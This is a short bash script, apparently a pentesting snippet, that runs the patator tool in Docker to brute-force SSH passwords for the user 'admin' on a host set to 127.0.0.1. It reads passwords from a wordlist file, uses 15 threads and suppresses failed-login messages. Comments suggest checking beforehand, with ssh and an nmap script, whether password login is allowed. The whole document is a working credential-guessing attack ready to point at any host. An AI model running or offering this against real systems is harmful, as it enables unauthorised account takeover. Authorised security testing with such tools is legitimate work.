#!/usr/bin/env bash

pass='/tmp/passwords.txt'
ip='127.0.0.1'
user='admin'
ignore='Authentication failed.'

docker run --rm -it -v $pass:/F0 \
patator ssh_login host=$ip \
user=$user password=FILE0 0=/F0 \
-x ignore:mesg="$ignore" \
--threads 15


# you should first check if SSH password login is allowed
# $ ssh -o PreferredAuthentications=none localhost
# $ nmap -p 22 --script ssh-auth-methods localhost
